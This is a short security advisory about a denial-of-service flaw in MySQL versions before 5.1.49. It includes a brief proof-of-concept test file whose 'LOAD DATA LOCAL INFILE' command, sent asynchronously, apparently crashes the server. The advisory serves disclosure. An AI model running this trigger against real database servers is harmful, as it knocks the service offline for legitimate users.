MySQL is prone to a denial-of-service vulnerability.

An attacker can exploit this issue to crash the database, denying access to legitimate users.

This issue affects versions prior to MySQL 5.1.49.

NOTE: This issue was previously covered in BID 42594 (Oracle MySQL Prior to 5.1.49 Multiple Denial Of Service Vulnerabilities) but has been given its own record to better document it.

# cat t/tst.test
# The file might exist or not, it does not make any difference.
# --send is important

CREATE TABLE test.t_load (id INT NOT NULL);
--send LOAD DATA LOCAL INFILE 'tb.txt' INTO TABLE test.t_load

#<EOF>
